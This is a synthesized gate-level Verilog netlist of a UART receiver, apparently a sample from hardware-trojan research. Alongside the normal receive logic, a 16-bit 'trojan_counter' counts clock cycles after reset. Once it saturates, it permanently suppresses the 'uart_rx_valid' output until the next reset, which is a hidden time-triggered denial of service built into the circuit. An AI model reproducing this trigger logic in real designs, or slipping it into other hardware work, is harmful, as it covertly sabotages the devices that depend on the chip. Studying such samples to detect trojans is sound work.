/* Generated by Yosys 0.9 (git sha1 1979e0b) */

module uart_rx(clk, resetn, uart_rxd, uart_rx_en, uart_rx_break, uart_rx_valid, uart_rx_data);
  wire [3:0] _000_;
  wire _001_;
  wire [13:0] _002_;
  wire [7:0] _003_;
  wire _004_;
  wire _005_;
  wire [15:0] _006_;
  wire [7:0] _007_;
  wire _008_;
  wire _009_;
  wire _010_;
  wire _011_;
  wire _012_;
  wire _013_;
  wire _014_;
  wire _015_;
  wire _016_;
  wire _017_;
  wire _018_;
  wire _019_;
  wire _020_;
  wire _021_;
  wire _022_;
  wire _023_;
  wire _024_;
  wire _025_;
  wire _026_;
  wire _027_;
  wire _028_;
  wire _029_;
  wire _030_;
  wire _031_;
  wire _032_;
  wire _033_;
  wire _034_;
  wire _035_;
  wire _036_;
  wire _037_;
  wire _038_;
  wire _039_;
  wire _040_;
  wire _041_;
  wire _042_;
  wire _043_;
  wire _044_;
  wire _045_;
  wire _046_;
  wire _047_;
  wire _048_;
  wire _049_;
  wire _050_;
  wire _051_;
  wire _052_;
  wire _053_;
  wire _054_;
  wire _055_;
  wire _056_;
  wire _057_;
  wire _058_;
  wire _059_;
  wire _060_;
  wire _061_;
  wire _062_;
  wire _063_;
  wire _064_;
  wire _065_;
  wire _066_;
  wire _067_;
  wire _068_;
  wire _069_;
  wire _070_;
  wire _071_;
  wire _072_;
  wire _073_;
  wire _074_;
  wire _075_;
  wire _076_;
  wire _077_;
  wire _078_;
  wire _079_;
  wire _080_;
  wire _081_;
  wire _082_;
  wire _083_;
  wire _084_;
  wire _085_;
  wire _086_;
  wire _087_;
  wire _088_;
  wire _089_;
  wire _090_;
  wire _091_;
  wire _092_;
  wire _093_;
  wire _094_;
  wire _095_;
  wire _096_;
  wire _097_;
  wire _098_;
  wire _099_;
  wire _100_;
  wire _101_;
  wire _102_;
  wire _103_;
  wire _104_;
  wire _105_;
  wire _106_;
  wire _107_;
  wire _108_;
  wire _109_;
  wire _110_;
  wire _111_;
  wire _112_;
  wire _113_;
  wire _114_;
  wire _115_;
  wire _116_;
  wire _117_;
  wire _118_;
  wire _119_;
  wire _120_;
  wire _121_;
  wire _122_;
  wire _123_;
  wire _124_;
  wire _125_;
  wire _126_;
  wire _127_;
  wire _128_;
  wire _129_;
  wire _130_;
  wire _131_;
  wire _132_;
  wire _133_;
  wire _134_;
  wire _135_;
  wire _136_;
  wire _137_;
  wire _138_;
  wire _139_;
  wire _140_;
  wire _141_;
  wire _142_;
  wire _143_;
  wire _144_;
  wire _145_;
  wire _146_;
  wire _147_;
  wire _148_;
  wire _149_;
  wire _150_;
  wire _151_;
  wire _152_;
  wire _153_;
  wire _154_;
  wire _155_;
  wire _156_;
  wire _157_;
  wire _158_;
  wire _159_;
  wire _160_;
  wire _161_;
  wire _162_;
  wire _163_;
  wire _164_;
  wire _165_;
  wire _166_;
  wire _167_;
  wire _168_;
  wire _169_;
  wire _170_;
  wire _171_;
  wire _172_;
  wire _173_;
  wire _174_;
  wire _175_;
  wire _176_;
  wire _177_;
  wire _178_;
  wire _179_;
  wire _180_;
  wire _181_;
  wire _182_;
  wire _183_;
  wire _184_;
  wire _185_;
  wire _186_;
  wire _187_;
  wire _188_;
  wire _189_;
  wire _190_;
  wire _191_;
  wire _192_;
  wire _193_;
  wire _194_;
  wire _195_;
  wire _196_;
  wire _197_;
  wire _198_;
  wire _199_;
  wire _200_;
  wire _201_;
  wire _202_;
  wire _203_;
  wire _204_;
  wire _205_;
  wire _206_;
  wire _207_;
  wire _208_;
  wire _209_;
  wire _210_;
  wire _211_;
  wire _212_;
  wire _213_;
  wire _214_;
  wire _215_;
  wire _216_;
  wire _217_;
  reg [3:0] bit_counter;
  reg bit_sample;
  input clk;
  reg [13:0] cycle_counter;
  reg [3:0] fsm_state;
  reg [7:0] received_data;
  input resetn;
  reg rxd_reg;
  reg rxd_reg_0;
  reg [15:0] trojan_counter;
  output uart_rx_break;
  output [7:0] uart_rx_data;
  reg [7:0] uart_rx_data;
  input uart_rx_en;
  output uart_rx_valid;
  input uart_rxd;
  assign _012_ = ~(fsm_state[0] & rxd_reg);
  assign _013_ = resetn & _012_;
  assign _014_ = ~(cycle_counter[5] | cycle_counter[4]);
  assign _015_ = ~(cycle_counter[10] | cycle_counter[13]);
  assign _016_ = ~(cycle_counter[1] | cycle_counter[0]);
  assign _017_ = cycle_counter[7] & cycle_counter[8];
  assign _018_ = _014_ & _016_;
  assign _019_ = _015_ & _017_;
  assign _020_ = _018_ & _019_;
  assign _021_ = cycle_counter[2] & ~(cycle_counter[3]);
  assign _022_ = ~(cycle_counter[9] | cycle_counter[12]);
  assign _023_ = cycle_counter[6] & cycle_counter[11];
  assign _024_ = _022_ & _023_;
  assign _025_ = _021_ & _024_;
  assign _026_ = _020_ & _025_;
  assign _027_ = ~(fsm_state[3] & _026_);
  assign _028_ = cycle_counter[9] & ~(cycle_counter[6]);
  assign _029_ = cycle_counter[12] & ~(cycle_counter[11]);
  assign _030_ = _028_ & _029_;
  assign _031_ = cycle_counter[3] & ~(cycle_counter[2]);
  assign _032_ = _030_ & _031_;
  assign _033_ = ~(_020_ & _032_);
  assign _034_ = ~(_027_ & _033_);
  assign _035_ = ~(fsm_state[3] & _034_);
  assign _036_ = _020_ & _031_;
  assign _037_ = ~(_030_ & _036_);
  assign _038_ = ~(_027_ & _037_);
  assign _008_ = ~(_013_ & _035_);
  assign _039_ = resetn & ~(_034_);
  assign _040_ = ~(fsm_state[3] & _039_);
  assign _041_ = ~(bit_counter[1] | bit_counter[0]);
  assign _042_ = bit_counter[3] & ~(bit_counter[2]);
  assign _043_ = _041_ & _042_;
  assign _044_ = resetn & fsm_state[1];
  assign _045_ = ~(_043_ & _044_);
  assign _011_ = ~(_040_ & _045_);
  assign _046_ = fsm_state[0] & ~(rxd_reg);
  assign _047_ = fsm_state[2] & ~(_034_);
  assign _048_ = _046_ | _047_;
  assign _010_ = resetn & _048_;
  assign _049_ = _043_ | ~(fsm_state[1]);
  assign _050_ = ~(fsm_state[2] & _034_);
  assign _051_ = ~(_049_ & _050_);
  assign _009_ = resetn & _051_;
  assign _052_ = trojan_counter[0] & trojan_counter[1];
  assign _053_ = trojan_counter[2] & _052_;
  assign _054_ = trojan_counter[3] & _053_;
  assign _055_ = trojan_counter[4] & _054_;
  assign _056_ = trojan_counter[5] & _055_;
  assign _057_ = trojan_counter[6] & _056_;
  assign _058_ = trojan_counter[7] & _057_;
  assign _059_ = trojan_counter[8] & _058_;
  assign _060_ = trojan_counter[9] & _059_;
  assign _061_ = trojan_counter[10] & trojan_counter[11];
  assign _062_ = _060_ & _061_;
  assign _063_ = trojan_counter[12] & _062_;
  assign _064_ = trojan_counter[13] & _063_;
  assign _065_ = trojan_counter[15] & trojan_counter[14];
  assign _066_ = ~(_064_ & _065_);
  assign _067_ = fsm_state[1] | fsm_state[2];
  assign _068_ = _046_ | _067_;
  assign _069_ = ~(_035_ | _068_);
  assign uart_rx_valid = _066_ & _069_;
  assign _070_ = ~(received_data[2] | received_data[3]);
  assign _071_ = ~(received_data[0] | received_data[1]);
  assign _072_ = _070_ & _071_;
  assign _073_ = ~(received_data[6] | received_data[7]);
  assign _074_ = ~(received_data[4] | received_data[5]);
  assign _075_ = _073_ & _074_;
  assign _076_ = _072_ & _075_;
  assign uart_rx_break = uart_rx_valid & _076_;
  assign _077_ = rxd_reg_0 | uart_rx_en;
  assign _078_ = uart_rxd | ~(uart_rx_en);
  assign _079_ = ~(_077_ & _078_);
  assign _005_ = ~(resetn & _079_);
  assign _080_ = rxd_reg | uart_rx_en;
  assign _081_ = rxd_reg_0 | ~(uart_rx_en);
  assign _082_ = ~(_080_ & _081_);
  assign _004_ = ~(resetn & _082_);
  assign _083_ = ~(fsm_state[3] | fsm_state[2]);
  assign _084_ = fsm_state[1] | ~(_083_);
  assign _085_ = cycle_counter[0] & _084_;
  assign _086_ = cycle_counter[0] ^ _084_;
  assign _002_[0] = _039_ & _086_;
  assign _087_ = cycle_counter[1] & _085_;
  assign _088_ = cycle_counter[1] | _085_;
  assign _089_ = resetn & _088_;
  assign _002_[1] = _089_ & ~(_087_);
  assign _090_ = cycle_counter[2] & _087_;
  assign _091_ = cycle_counter[2] ^ _087_;
  assign _002_[2] = _039_ & _091_;
  assign _092_ = cycle_counter[3] & _090_;
  assign _093_ = cycle_counter[3] ^ _090_;
  assign _002_[3] = _039_ & _093_;
  assign _094_ = cycle_counter[4] & _092_;
  assign _095_ = cycle_counter[4] | _092_;
  assign _096_ = resetn & _095_;
  assign _002_[4] = _096_ & ~(_094_);
  assign _097_ = cycle_counter[5] & _094_;
  assign _098_ = cycle_counter[5] | _094_;
  assign _099_ = resetn & _098_;
  assign _002_[5] = _099_ & ~(_097_);
  assign _100_ = cycle_counter[5] & cycle_counter[6];
  assign _101_ = _094_ & _100_;
  assign _102_ = cycle_counter[6] ^ _097_;
  assign _002_[6] = _039_ & _102_;
  assign _103_ = cycle_counter[7] & _101_;
  assign _104_ = cycle_counter[7] ^ _101_;
  assign _002_[7] = _039_ & _104_;
  assign _105_ = cycle_counter[8] | _103_;
  assign _106_ = _017_ & _100_;
  assign _107_ = _094_ & _106_;
  assign _108_ = _039_ & ~(_107_);
  assign _002_[8] = _105_ & _108_;
  assign _109_ = cycle_counter[9] & _107_;
  assign _110_ = cycle_counter[9] | _107_;
  assign _111_ = _039_ & _110_;
  assign _002_[9] = _111_ & ~(_109_);
  assign _112_ = cycle_counter[10] & _109_;
  assign _113_ = cycle_counter[10] | _109_;
  assign _114_ = resetn & _113_;
  assign _002_[10] = _114_ & ~(_112_);
  assign _115_ = cycle_counter[11] & _112_;
  assign _116_ = cycle_counter[11] | _112_;
  assign _117_ = _039_ & _116_;
  assign _002_[11] = _117_ & ~(_115_);
  assign _118_ = ~(cycle_counter[12] & _115_);
  assign _119_ = cycle_counter[12] | _115_;
  assign _120_ = _039_ & _119_;
  assign _002_[12] = _118_ & _120_;
  assign _121_ = ~(cycle_counter[13] ^ _118_);
  assign _002_[13] = resetn & _121_;
  assign _122_ = fsm_state[1] & _034_;
  assign _123_ = fsm_state[1] & _038_;
  assign _124_ = resetn & ~(fsm_state[0]);
  assign _125_ = _083_ & _124_;
  assign _126_ = bit_counter[0] & _123_;
  assign _127_ = bit_counter[0] ^ _123_;
  assign _000_[0] = _125_ & _127_;
  assign _128_ = bit_counter[1] | _126_;
  assign _129_ = bit_counter[1] & _126_;
  assign _130_ = _125_ & ~(_129_);
  assign _000_[1] = _128_ & _130_;
  assign _131_ = bit_counter[2] | _129_;
  assign _132_ = ~(bit_counter[2] & _129_);
  assign _133_ = _125_ & _132_;
  assign _000_[2] = _131_ & _133_;
  assign _134_ = ~(bit_counter[3] ^ _132_);
  assign _000_[3] = _125_ & _134_;
  assign _006_[0] = resetn & ~(trojan_counter[0]);
  assign _135_ = trojan_counter[0] | trojan_counter[1];
  assign _136_ = resetn & _135_;
  assign _006_[1] = _136_ & ~(_052_);
  assign _137_ = trojan_counter[2] | _052_;
  assign _138_ = resetn & _137_;
  assign _006_[2] = _138_ & ~(_053_);
  assign _139_ = trojan_counter[3] | _053_;
  assign _140_ = resetn & _139_;
  assign _006_[3] = _140_ & ~(_054_);
  assign _141_ = trojan_counter[4] | _054_;
  assign _142_ = resetn & _141_;
  assign _006_[4] = _142_ & ~(_055_);
  assign _143_ = trojan_counter[5] | _055_;
  assign _144_ = resetn & _143_;
  assign _006_[5] = _144_ & ~(_056_);
  assign _145_ = trojan_counter[6] | _056_;
  assign _146_ = resetn & _145_;
  assign _006_[6] = _146_ & ~(_057_);
  assign _147_ = trojan_counter[7] | _057_;
  assign _148_ = resetn & _147_;
  assign _006_[7] = _148_ & ~(_058_);
  assign _149_ = trojan_counter[8] | _058_;
  assign _150_ = resetn & _149_;
  assign _006_[8] = _150_ & ~(_059_);
  assign _151_ = trojan_counter[9] | _059_;
  assign _152_ = resetn & _151_;
  assign _006_[9] = _152_ & ~(_060_);
  assign _153_ = ~(trojan_counter[10] & _060_);
  assign _154_ = trojan_counter[10] | _060_;
  assign _155_ = resetn & _154_;
  assign _006_[10] = _153_ & _155_;
  assign _156_ = trojan_counter[11] | ~(_153_);
  assign _157_ = resetn & ~(_062_);
  assign _006_[11] = _156_ & _157_;
  assign _158_ = trojan_counter[12] | _062_;
  assign _159_ = resetn & _158_;
  assign _006_[12] = _159_ & ~(_063_);
  assign _160_ = trojan_counter[13] | _063_;
  assign _161_ = resetn & _160_;
  assign _006_[13] = _161_ & ~(_064_);
  assign _162_ = trojan_counter[14] | _064_;
  assign _163_ = resetn & _162_;
  assign _164_ = ~(trojan_counter[14] & _064_);
  assign _006_[14] = _163_ & _164_;
  assign _165_ = trojan_counter[15] | ~(_164_);
  assign _166_ = resetn & _066_;
  assign _006_[15] = _165_ & _166_;
  assign _167_ = ~(fsm_state[3] & received_data[0]);
  assign _168_ = fsm_state[3] | ~(uart_rx_data[0]);
  assign _169_ = ~(_167_ & _168_);
  assign _007_[0] = resetn & _169_;
  assign _170_ = ~(fsm_state[3] & received_data[1]);
  assign _171_ = fsm_state[3] | ~(uart_rx_data[1]);
  assign _172_ = ~(_170_ & _171_);
  assign _007_[1] = resetn & _172_;
  assign _173_ = ~(fsm_state[3] & received_data[2]);
  assign _174_ = fsm_state[3] | ~(uart_rx_data[2]);
  assign _175_ = ~(_173_ & _174_);
  assign _007_[2] = resetn & _175_;
  assign _176_ = ~(fsm_state[3] & received_data[3]);
  assign _177_ = fsm_state[3] | ~(uart_rx_data[3]);
  assign _178_ = ~(_176_ & _177_);
  assign _007_[3] = resetn & _178_;
  assign _179_ = ~(fsm_state[3] & received_data[4]);
  assign _180_ = fsm_state[3] | ~(uart_rx_data[4]);
  assign _181_ = ~(_179_ & _180_);
  assign _007_[4] = resetn & _181_;
  assign _182_ = ~(fsm_state[3] & received_data[5]);
  assign _183_ = fsm_state[3] | ~(uart_rx_data[5]);
  assign _184_ = ~(_182_ & _183_);
  assign _007_[5] = resetn & _184_;
  assign _185_ = ~(fsm_state[3] & received_data[6]);
  assign _186_ = fsm_state[3] | ~(uart_rx_data[6]);
  assign _187_ = ~(_185_ & _186_);
  assign _007_[6] = resetn & _187_;
  assign _188_ = ~(fsm_state[3] & received_data[7]);
  assign _189_ = fsm_state[3] | ~(uart_rx_data[7]);
  assign _190_ = ~(_188_ & _189_);
  assign _007_[7] = resetn & _190_;
  assign _191_ = ~(rxd_reg & _026_);
  assign _192_ = _026_ | ~(bit_sample);
  assign _193_ = ~(_191_ & _192_);
  assign _001_ = resetn & _193_;
  assign _194_ = ~(received_data[2] & _122_);
  assign _195_ = _122_ | ~(received_data[1]);
  assign _196_ = ~(_194_ & _195_);
  assign _003_[1] = _124_ & _196_;
  assign _197_ = ~(received_data[1] & _122_);
  assign _198_ = _122_ | ~(received_data[0]);
  assign _199_ = ~(_197_ & _198_);
  assign _003_[0] = _124_ & _199_;
  assign _200_ = ~(received_data[3] & _122_);
  assign _201_ = _122_ | ~(received_data[2]);
  assign _202_ = ~(_200_ & _201_);
  assign _003_[2] = _124_ & _202_;
  assign _203_ = ~(received_data[4] & _122_);
  assign _204_ = _122_ | ~(received_data[3]);
  assign _205_ = ~(_203_ & _204_);
  assign _003_[3] = _124_ & _205_;
  assign _206_ = received_data[4] | _123_;
  assign _207_ = _124_ & _206_;
  assign _208_ = received_data[5] | ~(_123_);
  assign _003_[4] = _207_ & _208_;
  assign _209_ = ~(received_data[6] & _122_);
  assign _210_ = _122_ | ~(received_data[5]);
  assign _211_ = ~(_209_ & _210_);
  assign _003_[5] = _124_ & _211_;
  assign _212_ = ~(received_data[7] & _122_);
  assign _213_ = _122_ | ~(received_data[6]);
  assign _214_ = ~(_212_ & _213_);
  assign _003_[6] = _124_ & _214_;
  assign _215_ = ~(bit_sample & _122_);
  assign _216_ = _122_ | ~(received_data[7]);
  assign _217_ = ~(_215_ & _216_);
  assign _003_[7] = _124_ & _217_;
  always @(posedge clk)
      fsm_state[0] <= _008_;
  always @(posedge clk)
      fsm_state[1] <= _009_;
  always @(posedge clk)
      fsm_state[2] <= _010_;
  always @(posedge clk)
      fsm_state[3] <= _011_;
  always @(posedge clk)
      rxd_reg <= _004_;
  always @(posedge clk)
      rxd_reg_0 <= _005_;
  always @(posedge clk)
      cycle_counter[0] <= _002_[0];
  always @(posedge clk)
      cycle_counter[1] <= _002_[1];
  always @(posedge clk)
      cycle_counter[2] <= _002_[2];
  always @(posedge clk)
      cycle_counter[3] <= _002_[3];
  always @(posedge clk)
      cycle_counter[4] <= _002_[4];
  always @(posedge clk)
      cycle_counter[5] <= _002_[5];
  always @(posedge clk)
      cycle_counter[6] <= _002_[6];
  always @(posedge clk)
      cycle_counter[7] <= _002_[7];
  always @(posedge clk)
      cycle_counter[8] <= _002_[8];
  always @(posedge clk)
      cycle_counter[9] <= _002_[9];
  always @(posedge clk)
      cycle_counter[10] <= _002_[10];
  always @(posedge clk)
      cycle_counter[11] <= _002_[11];
  always @(posedge clk)
      cycle_counter[12] <= _002_[12];
  always @(posedge clk)
      cycle_counter[13] <= _002_[13];
  always @(posedge clk)
      bit_sample <= _001_;
  always @(posedge clk)
      bit_counter[0] <= _000_[0];
  always @(posedge clk)
      bit_counter[1] <= _000_[1];
  always @(posedge clk)
      bit_counter[2] <= _000_[2];
  always @(posedge clk)
      bit_counter[3] <= _000_[3];
  always @(posedge clk)
      received_data[0] <= _003_[0];
  always @(posedge clk)
      received_data[1] <= _003_[1];
  always @(posedge clk)
      received_data[2] <= _003_[2];
  always @(posedge clk)
      received_data[3] <= _003_[3];
  always @(posedge clk)
      received_data[4] <= _003_[4];
  always @(posedge clk)
      received_data[5] <= _003_[5];
  always @(posedge clk)
      received_data[6] <= _003_[6];
  always @(posedge clk)
      received_data[7] <= _003_[7];
  always @(posedge clk)
      uart_rx_data[0] <= _007_[0];
  always @(posedge clk)
      uart_rx_data[1] <= _007_[1];
  always @(posedge clk)
      uart_rx_data[2] <= _007_[2];
  always @(posedge clk)
      uart_rx_data[3] <= _007_[3];
  always @(posedge clk)
      uart_rx_data[4] <= _007_[4];
  always @(posedge clk)
      uart_rx_data[5] <= _007_[5];
  always @(posedge clk)
      uart_rx_data[6] <= _007_[6];
  always @(posedge clk)
      uart_rx_data[7] <= _007_[7];
  always @(posedge clk)
      trojan_counter[0] <= _006_[0];
  always @(posedge clk)
      trojan_counter[1] <= _006_[1];
  always @(posedge clk)
      trojan_counter[2] <= _006_[2];
  always @(posedge clk)
      trojan_counter[3] <= _006_[3];
  always @(posedge clk)
      trojan_counter[4] <= _006_[4];
  always @(posedge clk)
      trojan_counter[5] <= _006_[5];
  always @(posedge clk)
      trojan_counter[6] <= _006_[6];
  always @(posedge clk)
      trojan_counter[7] <= _006_[7];
  always @(posedge clk)
      trojan_counter[8] <= _006_[8];
  always @(posedge clk)
      trojan_counter[9] <= _006_[9];
  always @(posedge clk)
      trojan_counter[10] <= _006_[10];
  always @(posedge clk)
      trojan_counter[11] <= _006_[11];
  always @(posedge clk)
      trojan_counter[12] <= _006_[12];
  always @(posedge clk)
      trojan_counter[13] <= _006_[13];
  always @(posedge clk)
      trojan_counter[14] <= _006_[14];
  always @(posedge clk)
      trojan_counter[15] <= _006_[15];
endmodule
